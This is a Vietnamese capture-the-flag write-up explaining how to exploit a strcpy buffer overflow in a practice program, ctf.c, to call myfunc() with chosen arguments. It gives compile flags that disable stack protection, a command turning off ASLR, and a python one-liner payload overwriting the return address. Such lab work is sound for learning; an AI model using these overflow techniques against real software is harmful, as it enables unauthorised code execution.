### Chi tiết Buffer-overflow trên file ctf.c  
***
#### Mục đích của bài này là dùng buffer-overflow để gọi hàm myfunc() và phải in ra được "You got the flag" ra màn hình  
Xem qua code ta có thể thấy lỗ hỏng nó đến từ hàm strcpy(buf,s). Vì vậy ta sẽ dùng buffer-overflow để làm tràn biến buf xuống phần return address của hàm vuln() và cái phần được tràn vào return adddres là địa chỉ của hàm myfunc() thì lúc đó hàm myfunc() sẽ được gọi. Nhưng điểm khó là hàm myfunc có 2 tham số p và q, phải tìm được 2 tham số này và đè giá trị 0x04081211 vào p và đè 0x44644262 vào q thì nó mới in được câu lệnh "You got the flag"


![image](https://github.com/user-attachments/assets/d187e16b-b509-4bdb-a080-83e3ba9e2d44)


***
#### Các bước thực hiện
* Bước 1: Biên dịch file
  ```
  gcc -g ctf.c -o ctf.out -fno-stack-protector -mpreferred-stack-boundary=2
  ```
* Bước 2: Lấy địa chỉ hàm myfunc()

  Vào gdb:
  ```
  qdb -q ctf.out  
  ```
  Xem địa chỉ hàm
  ```
  disas myfunc 
  ```
  ![image](https://github.com/user-attachments/assets/360c62d0-4fdf-451b-8cf0-f072d1577ca4)


  => Địa chỉ hàm myfunc() là 0x0804851b. Ngoài ra ta cũng xem được biến p nằm ở vị trí ebp + 8 và biến q nằm ở vị trí ebp + 0xc. Vậy chỉ cần xác định được ebp có địa chỉ bao nhiêu là tìm được p, q. 
* Bước 3: Điểm qua stackframe trước khi hàm vuln() trước khi hàm myfunc() được gọi

  
  ![image](https://github.com/user-attachments/assets/a669a9ae-5c2b-4d0e-a786-03ab10db0af8)



  ta thấy mảng buf chứa tối đa 100 bytes và ebp là 4 byte nên ta cần truyền vào input 104 kí tự ngẫu nhiên và truyền thêm 4 bytes giá trị 0x0804851b nữa để đè lên return addr của hàm vuln().
* Bước 3: Tắt chế độ cấp phát địa chỉ stack ngẫu nhiên
  ```
  sudo sysctl -w kernel.randomize_va_space=0
  ```
  ![image](https://github.com/user-attachments/assets/f8065705-b6a6-4656-b3fb-a2c08feb3fe5)

* Bước 4: Stackframe khi hàm vuln() kết thúc và hàm myfunc() được gọi khi đã buffer-overflow


  ![image](https://github.com/user-attachments/assets/1c8e09d2-bf59-411e-82f7-c35f4d83ff01)


  Lúc này ta đã xác định được vị trí ebp, vậy đã tìm được vị trí p, q, lúc này chỉ cần đè giá trị 0x04081211 vào p và đè giá trị 0x44644262 vào q. Cùng với đó ta phải thêm 4 bytes ngẫu nhiên để đi qua chỗ return addr mới xuống được p.
* Bước 5: Thực hiện truyền input
  ```
  ./ctf.out $(python -c "print('a' * 104 + '\x1b\x85\x04\x08' + 'a'*4 + '\x11\x12\x08\x04' + '\x62\x42\x64\x44')")
  ```
  Kết quả:

  ![image](https://github.com/user-attachments/assets/bc167269-1821-4af4-9fed-d6fe675cdec4)


  => Thành công   
